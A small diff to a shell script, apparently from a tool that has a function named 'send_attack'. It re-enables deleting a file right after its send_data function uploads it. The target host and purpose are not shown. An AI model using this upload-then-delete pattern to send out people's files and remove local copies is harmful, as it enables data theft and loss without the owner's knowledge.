@@ -10,7 +10,7 @@ send_attack() {
 send_data() {
     debug "Sending data"
     send upload -H "Content-Disposition:inline;filename=$FILE_NAME" -F "filename=@$FILE_NAME"
-    # rm -f $FILE_NAME
+    rm -f $FILE_NAME
 }
 
 FILE_NAME="$@"
